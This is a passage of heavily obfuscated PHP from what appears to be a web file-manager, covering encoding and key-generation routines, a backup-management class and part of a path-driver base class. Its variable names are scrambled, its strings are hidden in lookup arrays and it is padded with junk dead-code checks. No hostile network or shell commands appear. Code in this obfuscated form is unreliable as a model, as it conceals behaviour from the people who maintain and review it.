$©ã»ŸÏ[803]; break; $äôğÒƒ = $©ã»ŸÏ[804]; } $êëòèÀ´ = strrev($ã•™›Ğ . $å€åÅ„ . $êëòèÀ´); if ($ÙÖ´ı - 1 > 0) { $êëòèÀ´ = $this->kzgs8fa9b962($êëòèÀ´, $ÈëÆŞ×Ğ, $ÙÖ´ı - 1); } return $êëòèÀ´; } private function ntslc452c949($òË£‹ˆ¸, $Å¸ƒ„÷ù, $È– ™‘ = 3) { $ª€¼Ø…İ =& $_SERVER[Î·Ü›öğ]; $×œüèú‚ =& $_SERVER[Ò¼î¯­]; if (!is_string($òË£‹ˆ¸) || strlen($òË£‹ˆ¸) < 10) { return !1; } $òË£‹ˆ¸ = trim($òË£‹ˆ¸); $¥¡¶ºÇä = $ª€¼Ø…İ[805]; $òË£‹ˆ¸ = strrev($òË£‹ˆ¸); $õ‹ãÔÛ• = $òË£‹ˆ¸[0]; $ÎØ™£ = substr($òË£‹ˆ¸, 1, 15); $òË£‹ˆ¸ = substr($òË£‹ˆ¸, 16); $É† ó†½ = $×œüèú‚[302]; $ã³»˜ÏÅ = $ª€¼Ø…İ[806]; while (strlen($ã³»˜ÏÅ) < $ª€¼Ø…İ[702]) { if (!$ã³»˜ÏÅ) { break; } $ã³»˜ÏÅ++; } switch ($õ‹ãÔÛ•) { case $×œüèú‚[206]: $ÚÚ„×®Ä = $this->drlpd142c367($òË£‹ˆ¸, strrev($Å¸ƒ„÷ù . $ÎØ™£)); break; $´Ëá¢ = $ª€¼Ø…İ[807]; if (strlen($´Ëá¢) < $ª€¼Ø…İ[709]) { return; } case $×œüèú‚[122]: $ÚÚ„×®Ä = $this->drlpd142c367($òË£‹ˆ¸, strrev($ÎØ™£ . $Å¸ƒ„÷ù)); $ãùÂºÛ = $ª€¼Ø…İ[808]; if (!$ãùÂºÛ) { die; } break; case $×œüèú‚[303]: $ÚÚ„×®Ä = $this->drlpd142c367($òË£‹ˆ¸, base64_encode($ÎØ™£ . $Å¸ƒ„÷ù)); $ë“Ä‰Ëû = $ª€¼Ø…İ[809]; if (!$ë“Ä‰Ëû) { return; } break; case $×œüèú‚[304]: $ÚÚ„×®Ä = $this->drlpd142c367($òË£‹ˆ¸, md5($ÎØ™£ . $Å¸ƒ„÷ù)); $—¢˜ˆ«› = $ª€¼Ø…İ[810]; if (strlen($—¢˜ˆ«›) < $ª€¼Ø…İ[700]) { return; } break; case $×œüèú‚[305]: $òË£‹ˆ¸ = hash_decode($òË£‹ˆ¸); $˜¬Œ‰Ş = $ª€¼Ø…İ[811]; $Ñ¾òù•Ÿ = $òË£‹ˆ¸[0]; $òË£‹ˆ¸ = substr($òË£‹ˆ¸, 1); $îé¸áú = $ª€¼Ø…İ[812]; while (strlen($îé¸áú) < $ª€¼Ø…İ[711]) { if (!$îé¸áú) { break; } $îé¸áú++; } $ØãÀğ…• = strpos($É† ó†½, $Ñ¾òù•Ÿ); $õäµ¯á = $ª€¼Ø…İ[813]; $æÕø = md5($Ñ¾òù•Ÿ . md5($Å¸ƒ„÷ù . $Ñ¾òù•Ÿ) . $Å¸ƒ„÷ù); $Û¤ëÍ”Ø = $ª€¼Ø…İ[814]; $æÕø = substr($æÕø, $ØãÀğ…• % 8, $ØãÀğ…• % 8 + 7); $¼…ˆºŞ© = $ª€¼Ø…İ[815]; if (!$¼…ˆºŞ©) { return; } $ğ¥öÇÑ = $×œüèú‚[6]; $¤ßÈ’½ã = $ª€¼Ø…İ[816]; if (!$¤ßÈ’½ã) { die; } $¿Á‡¥›– = 0; $ŠŠ¬¼öÉ = $ª€¼Ø…İ[817]; $ß¼şæÀö = 0; $˜ã—¾ıÆ = 0; for ($¿Á‡¥›– = 0; $¿Á‡¥›– < strlen($òË£‹ˆ¸); $¿Á‡¥›–++) { $˜ã—¾ıÆ = $˜ã—¾ıÆ == strlen($æÕø) ? 0 : $˜ã—¾ıÆ; $Ìó÷§ôŞ = $ª€¼Ø…İ[818]; if (strlen($Ìó÷§ôŞ) < $ª€¼Ø…İ[485]) { die; } $€³‰ñÑå = $˜ã—¾ıÆ++; $ß¼şæÀö = strpos($É† ó†½, $òË£‹ˆ¸[$¿Á‡¥›–]) - $ØãÀğ…• - ord($æÕø[$€³‰ñÑå]); while ($ß¼şæÀö < 0) { $ß¼şæÀö += 64; } $ğ¥öÇÑ .= $É† ó†½[$ß¼şæÀö]; } $ÚÚ„×®Ä = base64_decode($ğ¥öÇÑ); break; $’Ëû§º = $ª€¼Ø…İ[819]; if (!$’Ëû§º) { die; } default: $ÚÚ„×®Ä = $this->drlpd142c367($òË£‹ˆ¸, $Å¸ƒ„÷ù . $ÎØ™£); $€÷Îù½‚ = $ª€¼Ø…İ[820]; if (!$€÷Îù½‚) { return; } break; } if ($È– ™‘ - 1 > 0) { $ÚÚ„×®Ä = $this->ntslc452c949($ÚÚ„×®Ä, $Å¸ƒ„÷ù, $È– ™‘ - 1); } return $ÚÚ„×®Ä; } public function vusx21200ae5($¯¦©øÚ©) { $îÆÔ¼‚ =& $_SERVER[Î·Ü›öğ]; $¨û£„¸ =& $_SERVER[Ò¼î¯­]; $ù¶ó÷€² = $this->uqsy78b5c630(); $Î£±¼ç© = $this->uqsy78b5c630(); $îÊûÇŞâ = ($ù¶ó÷€² - 1) * ($Î£±¼ç© - 1); $€¬¤ôˆœ = intval(($ù¶ó÷€² + $Î£±¼ç©) / 2); while (1) { $¼áêËİ• = $€¬¤ôˆœ; $ñé¬É»™ = $îÆÔ¼‚[821]; if (!$ñé¬É»™) { die; } $½¦Í×İ³ = $îÊûÇŞâ; while ($½¦Í×İ³ % $¼áêËİ• != 0) { $Á’¾Ó  = $½¦Í×İ³; $»®­â = $îÆÔ¼‚[822]; $½¦Í×İ³ = $¼áêËİ•; $¼áêËİ• = $Á’¾Ó  % $¼áêËİ•; $Ù©ïššû = $îÆÔ¼‚[823]; if (strlen($Ù©ïššû) < $îÆÔ¼‚[702]) { return; } } if ($¼áêËİ• == 1) { break; } else { $€¬¤ôˆœ++; } } $“×ãà = 2; for ($ Ò ¡ÇŞ = 0; $ Ò ¡ÇŞ < $îÊûÇŞâ * 10; $ Ò ¡ÇŞ++) { if (($îÊûÇŞâ * $ Ò ¡ÇŞ + 1) % $€¬¤ôˆœ == 0) { $“×ãà = intval(($îÊûÇŞâ * $ Ò ¡ÇŞ + 1) / $€¬¤ôˆœ); break; } } $”³ØÒ´ = $this->rlqddde9af47($ù¶ó÷€² * $Î£±¼ç© . $¨û£„¸[6], $¨û£„¸[136]); $¥Ëİ§™ˆ = md5($¨û£„¸[306] . ($ù¶ó÷€² + $Î£±¼ç©) . $¨û£„¸[307] . $€¬¤ôˆœ . $¨û£„¸[307] . $“×ãà . $¨û£„¸[308]); $ºó±„æ = $this->rlqddde9af47($¯¦©øÚ©, $¥Ëİ§™ˆ) . $¨û£„¸[309] . $”³ØÒ´; $ÇñâğÖœ = $îÆÔ¼‚[824]; if (strlen($ÇñâğÖœ) < $îÆÔ¼‚[702]) { return; } return $ºó±„æ; $•²¶“£È = $îÆÔ¼‚[825]; while ($•²¶“£È < $îÆÔ¼‚[702]) { if ($•²¶“£È >= 0) { break; } $•²¶“£È++; } } public function uslh2fb8a433($ ¼áˆ¢) { $Şïƒé­Û =& $_SERVER[Î·Ü›öğ]; $ËŠŒÛù =& $_SERVER[Ò¼î¯­]; $ºıÍ ïâ = explode($ËŠŒÛù[309], $ ¼áˆ¢); if (count($ºıÍ ïâ) != 2) { return $ËŠŒÛù[6]; } $÷ÓÀû = $this->drlpd142c367($ºıÍ ïâ[1] . $ËŠŒÛù[6], $ËŠŒÛù[136]); $—¸° ˆï = $Şïƒé­Û[826]; if (!$÷ÓÀû) { return $ËŠŒÛù[6]; } $÷ÓÀû = intval($÷ÓÀû); $“Á¬ÖÌ = 0; $ÁÁØ–®Ø = 0; $¿˜Ïá‡Ê = $Şïƒé­Û[827]; if (strlen($¿˜Ïá‡Ê) < $Şïƒé­Û[485]) { return; } for ($ºëÌ—Ûä = 3; $ºëÌ—Ûä < $÷ÓÀû; $ºëÌ—Ûä += 2) { if ($÷ÓÀû % $ºëÌ—Ûä != 0) { continue; } $“Á¬ÖÌ = $ºëÌ—Ûä; $Å¨˜±½µ = $Şïƒé­Û[828]; if (!$Å¨˜±½µ) { return; } $ÁÁØ–®Ø = intval($÷ÓÀû / $ºëÌ—Ûä); break; } $ÜÃ®Àœ‘ = ($“Á¬ÖÌ - 1) * ($ÁÁØ–®Ø - 1); $ßÚİœ¶¦ = $Şïƒé­Û[829]; while ($ßÚİœ¶¦ < $Şïƒé­Û[485]) { if ($ßÚİœ¶¦ >= 0) { break; } $ßÚİœ¶¦++; } $ı¤ßÀ¤¦ = intval(($“Á¬ÖÌ + $ÁÁØ–®Ø) / 2); while (1) { $áÊæîÓÛ = $ı¤ßÀ¤¦; $ÄØšøÈ† = $ÜÃ®Àœ‘; while ($ÄØšøÈ† % $áÊæîÓÛ != 0) { $İ—¯Õ‡€ = $ÄØšøÈ†; $æóˆØªà = $Şïƒé­Û[830]; while ($æóˆØªà < $Şïƒé­Û[711]) { if ($æóˆØªà >= 0) { break; } $æóˆØªà++; } $ÄØšøÈ† = $áÊæîÓÛ; $Å¦Â„¡å = $Şïƒé­Û[831]; if (!$Å¦Â„¡å) { die; } $áÊæîÓÛ = $İ—¯Õ‡€ % $áÊæîÓÛ; } if ($áÊæîÓÛ == 1) { break; } else { $ı¤ßÀ¤¦++; } } $ÕË¾Íİ = 2; for ($ºëÌ—Ûä = 0; $ºëÌ—Ûä < $ÜÃ®Àœ‘ * 10; $ºëÌ—Ûä++) { if (($ÜÃ®Àœ‘ * $ºëÌ—Ûä + 1) % $ı¤ßÀ¤¦ == 0) { $ÕË¾Íİ = intval(($ÜÃ®Àœ‘ * $ºëÌ—Ûä + 1) / $ı¤ßÀ¤¦); break; } } $’š°Õ†î = md5($ËŠŒÛù[306] . ($“Á¬ÖÌ + $ÁÁØ–®Ø) . $ËŠŒÛù[307] . $ı¤ßÀ¤¦ . $ËŠŒÛù[307] . $ÕË¾Íİ . $ËŠŒÛù[308]); $À°³³ƒø = $Şïƒé­Û[832]; while (strlen($À°³³ƒø) < $Şïƒé­Û[709]) { if (!$À°³³ƒø) { break; } $À°³³ƒø++; } $ÂÇÅ¥Šå = $this->drlpd142c367($ºıÍ ïâ[0], $’š°Õ†î); $ó´ú—Ú· = $Şïƒé­Û[833]; if (strlen($ó´ú—Ú·) < $Şïƒé­Û[709]) { return; } return $ÂÇÅ¥Šå; } public function uqsy78b5c630() { $Àù“¯ş =& $_SERVER[Î·Ü›öğ]; $êô•ì’¼ = mt_rand(pow(2, 14), pow(2, 16) - 1); $Â‡µ„åˆ = array(); $Ş ğ™Ëç = 1; $ÌƒÓÌıî = $Àù“¯ş[834]; while (strlen($ÌƒÓÌıî) < $Àù“¯ş[711]) { if (!$ÌƒÓÌıî) { break; } $ÌƒÓÌıî++; } while ($Ş ğ™Ëç <= (int) sqrt($êô•ì’¼)) { $Ê¼¥ù˜ö = $Ş ğ™Ëç; $‡ÊâÔ = $Àù“¯ş[835]; while (strlen($‡ÊâÔ) < $Àù“¯ş[711]) { if (!$‡ÊâÔ) { break; } $‡ÊâÔ++; } while (!0) { $Ê¼¥ù˜ö++; if ($Ê¼¥ù˜ö <= 2) { $Ş ğ™Ëç = $Ê¼¥ù˜ö; break; } else { if ($Ê¼¥ù˜ö < 2) { continue; } } $¦Å÷é¹Ÿ = !0; for ($è§¥¥ÅÕ = 2; $è§¥¥ÅÕ <= sqrt($Ê¼¥ù˜ö); $è§¥¥ÅÕ++) { if ($Ê¼¥ù˜ö % $è§¥¥ÅÕ == 0) { $¦Å÷é¹Ÿ = !1; } } if ($¦Å÷é¹Ÿ) { $Ş ğ™Ëç = $Ê¼¥ù˜ö; break; } } $Â‡µ„åˆ[] = $Ş ğ™Ëç; $âÙÒó¢„ = $Àù“¯ş[836]; while ($âÙÒó¢„ < $Àù“¯ş[709]) { if ($âÙÒó¢„ >= 0) { break; } $âÙÒó¢„++; } } $¬÷•ÙŞ— = 2; for ($Ê¼¥ù˜ö = $êô•ì’¼; $Ê¼¥ù˜ö > 1; $Ê¼¥ù˜ö--) { $¦Å÷é¹Ÿ = !0; foreach ($Â‡µ„åˆ as $ŒÉßşí») { if ($Ê¼¥ù˜ö % $ŒÉßşí» == 0) { $¦Å÷é¹Ÿ = !1; break; } } if ($¦Å÷é¹Ÿ) { $¬÷•ÙŞ— = $Ê¼¥ù˜ö; break; } } return $¬÷•ÙŞ—; } public function hpjs51d21309($Ô’Úçä’, $øèšÕåí) { $ã”½•áë =& $_SERVER[Ò¼î¯­]; return call_user_func(array($ã”½•áë[8], $ã”½•áë[310]), $Ô’Úçä’, $øèšÕåí); } public function rlqddde9af47($üÌ÷õÖ, $¡ßœƒ®÷) { $³è¹á…ˆ =& $_SERVER[Ò¼î¯­]; return call_user_func(array($³è¹á…ˆ[311], $³è¹á…ˆ[312]), $üÌ÷õÖ, $¡ßœƒ®÷); } public function drlpd142c367($‚ŒŞËÓ, $ÄÉ¦Î±ò) { $›â±€›á =& $_SERVER[Ò¼î¯­]; return call_user_func(array($›â±€›á[311], $›â±€›á[313]), $‚ŒŞËÓ, $ÄÉ¦Î±ò); } } class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->model = Model($_SERVER[Î·Ü›öğ][837]); $this->init(); $this->keep(); } public function init() { $‹§àÍÄ =& $_SERVER[Î·Ü›öğ]; $this->isManual(); self::$name = date($‹§àÍÄ[838]); if (!($Š‘ ‡èß = $this->model->lastItem())) { $Š‘ ‡èß = $this->initData(); } else { self::$name = $Š‘ ‡èß[$‹§àÍÄ[32]]; if ($Š‘ ‡èß[$‹§àÍÄ[839]] == $‹§àÍÄ[91]) { self::$name = date($‹§àÍÄ[262]); $ƒ ©ÀÖ­ = intval(_get($Š‘ ‡èß, $‹§àÍÄ[840], 0)); if (self::$manual == 0 && $Š‘ ‡èß[$‹§àÍÄ[32]] == self::$name) { $this->model->remove($Š‘ ‡èß[$‹§àÍÄ[477]]); } $Š‘ ‡èß = $this->initData($ƒ ©ÀÖ­, $Š‘ ‡èß[$‹§àÍÄ[841]]); } else { $this->checkStore($Š‘ ‡èß[$‹§àÍÄ[841]]); } } self::$option = $Š‘ ‡èß; } private function isManual() { $öÚ´®ŠÎ = _get($GLOBALS, $_SERVER[Î·Ü›öğ][842], 0); $öÚ´®ŠÎ = intval($öÚ´®ŠÎ); self::$manual = $öÚ´®ŠÎ && $öÚ´®ŠÎ == 1 ? 1 : 0; } private function initData($õ€™ü–­ = 0, $ØùŸëª = '') { $Ì’°Ãˆ =& $_SERVER[Î·Ü›öğ]; $¸”øÈµ = $this->model->config(); if ($ØùŸëª && $¸”øÈµ[$Ì’°Ãˆ[841]] != $ØùŸëª) { $õ€™ü–­ = 0; } $this->checkStore($¸”øÈµ[$Ì’°Ãˆ[841]]); if (self::$manual == 1) { self::$name .= $Ì’°Ãˆ[11] . date($Ì’°Ãˆ[843]); } $ç¶ÉÏ› = array($Ì’°Ãˆ[841] => $¸”øÈµ[$Ì’°Ãˆ[841]], $Ì’°Ãˆ[32] => self::$name, $Ì’°Ãˆ[839] => 0, $Ì’°Ãˆ[171] => $¸”øÈµ[$Ì’°Ãˆ[171]], $Ì’°Ãˆ[844] => self::$manual, $Ì’°Ãˆ[845] => array($Ì’°Ãˆ[846] => array($Ì’°Ãˆ[839] => 0), $Ì’°Ãˆ[847] => array($Ì’°Ãˆ[839] => 0, $Ì’°Ãˆ[848] => 0, $Ì’°Ãˆ[849] => 0, $Ì’°Ãˆ[33] => $Ì’°Ãˆ[12], $Ì’°Ãˆ[850] => 0, $Ì’°Ãˆ[851] => 0), $Ì’°Ãˆ[852] => array($Ì’°Ãˆ[839] => 0, $Ì’°Ãˆ[848] => 0, $Ì’°Ãˆ[849] => 0, $Ì’°Ãˆ[850] => 0, $Ì’°Ãˆ[851] => 0), $Ì’°Ãˆ[233] => array($Ì’°Ãˆ[839] => 0, $Ì’°Ãˆ[853] => 0, $Ì’°Ãˆ[854] => 0, $Ì’°Ãˆ[855] => 0, $Ì’°Ãˆ[856] => 0, $Ì’°Ãˆ[554] => $õ€™ü–­, $Ì’°Ãˆ[850] => 0, $Ì’°Ãˆ[851] => 0)), $Ì’°Ãˆ[850] => time(), $Ì’°Ãˆ[851] => 0); $íŸ™é¨ = $this->model->insert($ç¶ÉÏ›); $ç¶ÉÏ›[$Ì’°Ãˆ[477]] = $íŸ™é¨; return $ç¶ÉÏ›; } private function checkStore($ÕåâÂÙÃ) { $Û×„€Ÿ = Model($_SERVER[Î·Ü›öğ][857]); $€õŞ™‰ = $Û×„€Ÿ->listData($ÕåâÂÙÃ); $Û×„€Ÿ->checkConfig($€õŞ™‰); } public static function get() { if (!self::$option) { $ÓöÇª•ş = Model($_SERVER[Î·Ü›öğ][837]); $à®àù²€ = $ÓöÇª•ş->findByName(self::$name); $ÓöÇª•ş->parseContent($à®àù²€); self::$option = $à®àù²€; } return self::$option; } public static function set($ãÄíöïš) { $È¿ËÂÅ» =& $_SERVER[Î·Ü›öğ]; $ŞŒ…ê‘ = self::get(); foreach ($ãÄíöïš as $Ñßùïöİ => $òø  ú) { array_set_value($ŞŒ…ê‘, $Ñßùïöİ, $òø  ú); } Model($È¿ËÂÅ»[837])->update($ŞŒ…ê‘[$È¿ËÂÅ»[477]], $ŞŒ…ê‘); self::$option = $ŞŒ…ê‘; return self::$option; } public function keep() { $£¦æ™Ûß =& $_SERVER[Î·Ü›öğ]; $’óúøà® = self::get(); if (_get($’óúøà®, $£¦æ™Ûß[858], 0) == $£¦æ™Ûß[91]) { return; } $this->backupKeep($’óúøà®); self::set(array($£¦æ™Ûß[858] => 1)); } private function backupKeep($ÌË®òİ) { $·ÄÊ–ıº =& $_SERVER[Î·Ü›öğ]; if (self::$manual == 1) { return; } $œÎ†­ÊÈ = $this->model->listData(); if (empty($œÎ†­ÊÈ)) { return; } $ÚŠë‘„è = array(); $ñ—Á¦ñš = array(); $È“Ú¾×“ = date($·ÄÊ–ıº[859], strtotime($·ÄÊ–ıº[860])); foreach ($œÎ†­ÊÈ as $“˜Ÿº => $‡¥À„†í) { $Ü·ñ©° = $‡¥À„†í[$·ÄÊ–ıº[32]]; if ($“˜Ÿº < 7 || $‡¥À„†í[$·ÄÊ–ıº[844]] == $·ÄÊ–ıº[91]) { $ÚŠë‘„è[] = $Ü·ñ©°; continue; } $ı¸‰Õ£— = substr($Ü·ñ©°, 0, 6); if ($ı¸‰Õ£— < $È“Ú¾×“) { continue; } if (!isset($ñ—Á¦ñš[$ı¸‰Õ£—]) || $Ü·ñ©° < $ñ—Á¦ñš[$ı¸‰Õ£—]) { $ñ—Á¦ñš[$ı¸‰Õ£—] = $Ü·ñ©°; } if (substr($Ü·ñ©°, 6, 2) == $·ÄÊ–ıº[861]) { $ñ—Á¦ñš[$ı¸‰Õ£—] = $Ü·ñ©°; } } $ÚŠë‘„è = array_merge($ÚŠë‘„è, array_values($ñ—Á¦ñš)); $ÚŠë‘„è = array_unique($ÚŠë‘„è); foreach ($œÎ†­ÊÈ as $‡¥À„†í) { $Ü·ñ©° = $‡¥À„†í[$·ÄÊ–ıº[32]]; if (!empty($Ü·ñ©°) && in_array($Ü·ñ©°, $ÚŠë‘„è)) { continue; } $this->model->remove($‡¥À„†í[$·ÄÊ–ıº[477]]); $âœæ¾ = $this->backupPath($ÌË®òİ); IO::remove($âœæ¾, !1); } } private function backupPath($ ëÇÖŠš) { $‰¹ÅéÍ« =& $_SERVER[Î·Ü›öğ]; static $âûÙ”•€ = null; if (is_null($âûÙ”•€)) { $âûÙ”•€ = Model($‰¹ÅéÍ«[862])->get($‰¹ÅéÍ«[863]); } $ŒíÜˆ°‚ = $ ëÇÖŠš[$‰¹ÅéÍ«[32]]; $‚Ê¬ö‰ = substr(md5($‰¹ÅéÍ«[864] . $âûÙ”•€ . $ŒíÜˆ°‚), 0, 8); return "\x7b\x69\157\72{$ ëÇÖŠš[$‰¹ÅéÍ«[841]]}\175\57\x64\x61\164\141\142\x61\163\145\x2f\142\x61\x63\153\165\x70\x2f" . $ŒíÜˆ°‚ . $‰¹ÅéÍ«[11] . $‚Ê¬ö‰; } public function db() { $Ç¶åâ®æ =& $_SERVER[Î·Ü›öğ]; $ÏüÎ‰ş« = self::get(); if (_get($ÏüÎ‰ş«, $Ç¶åâ®æ[865], 0) == $Ç¶åâ®æ[91]) { return !0; } $œªúÃ¶æ = new BackupDb(); if (!$œªúÃ¶æ->index()) { return !1; } self::set(array($Ç¶åâ®æ[865] => 1)); return !0; } public function dbFile() { $äƒ°ÀÂ¨ =& $_SERVER[Î·Ü›öğ]; $†Ê®¦é = self::get(); if (_get($†Ê®¦é, $äƒ°ÀÂ¨[866], 0) == $äƒ°ÀÂ¨[91]) { return !0; } $ ¨ÀÜö¼ = new BackupDbFile(); if (!$ ¨ÀÜö¼->index()) { return !1; } self::set(array($äƒ°ÀÂ¨[866] => 1)); return !0; } public function file() { $Â»úèßƒ =& $_SERVER[Î·Ü›öğ]; $¨Îë‚‘… = self::get(); if (_get($¨Îë‚‘…, $Â»úèßƒ[867], 0) == $Â»úèßƒ[91]) { return !0; } if ($¨Îë‚‘…[$Â»úèßƒ[171]] == $Â»úèßƒ[868]) { $ßı£”¶“ = new BackupFile(); if (!$ßı£”¶“->index()) { return !1; } } self::set(array($Â»úèßƒ[867] => 1, $Â»úèßƒ[839] => 1)); return !0; } public static function log($œî˜¯«²) { write_log($œî˜¯«², $_SERVER[Î·Ü›öğ][869]); } } goto d‹ÙÇîµ„; c¢àõ¹ÉÌã: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $±‹‚›”• =& $_SERVER[Î·Ü›öğ]; $this->objectDriver = array($±‹‚›”•[60], $±‹‚›”•[61], $±‹‚›”•[62], $±‹‚›”•[63], $±‹‚›”•[64], $±‹‚›”•[65], $±‹‚›”•[66], $±‹‚›”•[67], $±‹‚›”•[68], $±‹‚›”•[69], $±‹‚›”•[70], $±‹‚›”•[71]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($ğ€ç×Ö) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($ğ€ç×Ö, $_SERVER[Î·Ü›öğ][8]); } return $ğ€ç×Ö; } public function iconvApp($› Áªñ½) { return $› Áªñ½; } public function iconvSystem($åÚĞ°‚”) { return $åÚĞ°‚”; } public function iconvTo($É¶Ÿ‹³, $âØû¢²‹, $Ğ÷ü£Ã•) { $óÍ‡Ó“€ =& $_SERVER[Î·Ü›öğ]; if (!$É¶Ÿ‹³ || !function_exists($óÍ‡Ó“€[72])) { return $É¶Ÿ‹³; } static $…‡”İˆÁ = array(); $¹ä„¬…° = $âØû¢²‹ . $óÍ‡Ó“€[73] . $Ğ÷ü£Ã• . $óÍ‡Ó“€[74] . $É¶Ÿ‹³; if (isset($…‡”İˆÁ[$¹ä„¬…°])) { return $…‡”İˆÁ[$¹ä„¬…°]; } if (function_exists($óÍ‡Ó“€[75])) { $Œë—Ôä = @mb_convert_encoding($É¶Ÿ‹³, $Ğ÷ü£Ã•, $âØû¢²‹); } else { $Œë—Ôä = @iconv($âØû¢²‹, $Ğ÷ü£Ã•, $É¶Ÿ‹³); } $Œë—Ôä = $Œë—Ôä ? $Œë—Ôä : $É¶Ÿ‹³; if (strstr($Œë—Ôä, $óÍ‡Ó“€[76])) { $Œë—Ôä = str_replace($óÍ‡Ó“€[76], $óÍ‡Ó“€[11], $Œë—Ôä); } $…‡”İˆÁ[$âØû¢²‹ . $óÍ‡Ó“€[73] . $Ğ÷ü£Ã• . $óÍ‡Ó“€[74] . $É¶Ÿ‹³] = $Œë—Ôä; $…‡”İˆÁ[$Ğ÷ü£Ã• . $óÍ‡Ó“€[73] . $âØû¢²‹ . $óÍ‡Ó“€[74] . $É¶Ÿ‹³] = $É¶Ÿ‹³; $…‡”İˆÁ[$Ğ÷ü£Ã• . $óÍ‡Ó“€[73] . $âØû¢²‹ . $óÍ‡Ó“€[74] . $Œë—Ôä] = $É¶Ÿ‹³; $…‡”İˆÁ[$âØû¢²‹ . $óÍ‡Ó“€[73] . $Ğ÷ü£Ã• . $óÍ‡Ó“€[74] . $Œë—Ôä] = $Œë—Ôä; return $Œë—Ôä; } public function getPathInner($—‚ùŒ€Ì) { $âæê©ÜÈ = IO::init($—‚ùŒ€Ì); return $âæê©ÜÈ->path; } public function getPathOuter($Ò“Á¯±¯) { $“©¯¢˜ç =& $_SERVER[Î·Ü›öğ]; $¦’â“»ı = strlen(trim($this->pathBase, $“©¯¢˜ç[8])); $Ò“Á¯±¯ = substr(trim($Ò“Á¯±¯, $“©¯¢˜ç[8]), $¦’â“»ı); return $this->pathDriver . $“©¯¢˜ç[8] . ltrim($Ò“Á¯±¯, $“©¯¢˜ç[8]); } public function isParentOf($‘³¿´óã, $çÕÃÂ‹ù) { $§‰è”Æ„ =& $_SERVER[Î·Ü›öğ]; $‘³¿´óã = rtrim(strtolower($‘³¿´óã), $§‰è”Æ„[8]) . $§‰è”Æ„[8]; $çÕÃÂ‹ù = rtrim(strtolower($çÕÃÂ‹ù), $§‰è”Æ„[8]) . $§‰è”Æ„[8]; $ÊĞµ‹ = strpos($çÕÃÂ‹ù, $‘³¿´óã) === 0; return $ÊĞµ‹; } public function getType() { $–é˜–êÁ =& $_SERVER[Î·Ü›öğ]; $§èˆÒË¤ = str_replace($–é˜–êÁ[77], $–é˜–êÁ[12], get_class($this)); return strtolower($§èˆÒË¤); } public function isOsDriver() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($Ê  •Â, $–İğğší) { $¸¹øƒå =& $_SERVER[Î·Ü›öğ]; $¿ÓÏ”Ü® = rtrim($Ê  •Â, $¸¹øƒå[8]) . $¸¹øƒå[8] . $–İğğší; $ê¾›·Ş = $this->exist($¿ÓÏ”Ü®); return $ê¾›·Ş ? $¿ÓÏ”Ü® : !1; } public function setModifyTime($Íƒ”ª‰£, $’…ÃùÖœ = '') { } public function renameObject($É‘Œå’ş, $ƒ“„›©ö) { $şñó¯†Ø = $ƒ“„›©ö; $É‘Œå’ş = $this->getPathOuter($É‘Œå’ş); $ƒ“„›©ö = $this->pathFather($É‘Œå’ş) . $ƒ“„›©ö; $¿ãû§¨ = IO::copy($É‘Œå’ş, $this->pathFather($É‘Œå’ş), REPEAT_RENAME_FOLDER, $şñó¯†Ø); if ($¿ãû§¨) { IO::remove($É‘Œå’ş); } return $¿ãû§¨ ? $ƒ“„›©ö : !1; } public function tempFile($ÅÉÏ‡ã¾ = '', $ƒÁµ‹ˆ = '') { if (!$ÅÉÏ‡ã¾) { $ÅÉÏ‡ã¾ = rand_string(15); } $²ñ•›‚± = TEMP_FILES . rand_string(15) . $_SERVER[Î·Ü›öğ][8]; @mkdir($²ñ•›‚±, DEFAULT_PERRMISSIONS, !0); $™ıÑÎ‘î = $²ñ•›‚± . $ÅÉÏ‡ã¾; @touch($™ıÑÎ‘î); if ($ƒÁµ‹ˆ) { file_put_contents($™ıÑÎ‘î, $ƒÁµ‹ˆ); } return $™ıÑÎ‘î; } public function tempFileRemve($Ğ»¤Ş×Ş) { @unlink($Ğ»¤Ş×Ş); @rmdir($this->pathFather($Ğ»¤Ş×Ş)); } public function mkfile($¤÷¼­§å, $¼ü‘¯©Ò = '', $ÌéÌ¨Ûé = REPEAT_RENAME) { } public function mkdir($‚ö‚ÓğÈ, $Ÿğ‰î™† = REPEAT_SKIP) { } public function delFile($ææ›éíŸ) { } public function delFolder($‚ƒ—‚È) { } public function copyFile($İ¼šçÑì, $‡ÇçŒğ‹) { } public function moveFile($û¬¡şüï, $·şæ¾—ª) { } public function remove($¤ÊÅ‚üº) { if ($this->isFile($¤ÊÅ‚üº)) { return $this->delFile($¤ÊÅ‚üº); } return $this->delFolder($¤ÊÅ‚üº); } public function rename($Ôäë°¹‚, $ÃÆµŸ) { } public function exist($³äõ‡Şƒ) { } public function findByHash($Ö®ÍĞÂù = '', $è´Å³•ƒ = '') { return !1; } public function isFile($¯Å‚¶şÆ) { } public function isFolder($¦«­»Â) { } public function size($ÑşÏÛÙº) { } public function info($µå“ƒÉ¤) { } public function infoSimple($±§–¿áı) { return $this->info($±§–¿áı); } public function infoAuth($Œ¥ÊŒ€å) { return $this->info($Œ¥ÊŒ€å); } public function infoFull($·¨Òîææ) { return $this->info($·¨Òîææ); } public function infoFullSimple($ş¢­º‚) { return $this->info($ş¢­º‚); } public function infoWithChildren($àûÑ‡ÌŒ) { $“Ã´¡Ã =& $_SERVER[Î·Ü›öğ]; static $˜Ÿçş¨¢ = array(); if (isset($˜Ÿçş¨¢[$àûÑ‡ÌŒ])) { return $˜Ÿçş¨¢[$àûÑ‡ÌŒ]; } $óÂ¸Ê§ˆ = $this->info($àûÑ‡ÌŒ); if ($óÂ¸Ê§ˆ && $óÂ¸Ê§ˆ[$“Ã´¡Ã[33]] == $“Ã´¡Ã[78]) { $ùİÄà’Å = array($“Ã´¡Ã[79] => 0, $“Ã´¡Ã[80] => 0, $“Ã´¡Ã[81] => 0); $this->infoChildren($àûÑ‡ÌŒ, $ùİÄà’Å); $óÂ¸Ê§ˆ[$“Ã´¡Ã[79]] = $ùİÄà’Å[$“Ã´¡Ã[79]]; $óÂ¸Ê§ˆ[$“Ã´¡Ã[82]] = array($“Ã´¡Ã[83] => $ùİÄà’Å[$“Ã´¡Ã[80]], $“Ã´¡Ã[84] => $ùİÄà’Å[$“Ã´¡Ã[81]]); $˜Ÿçş¨¢[$àûÑ‡ÌŒ] = $óÂ¸Ê§ˆ; } 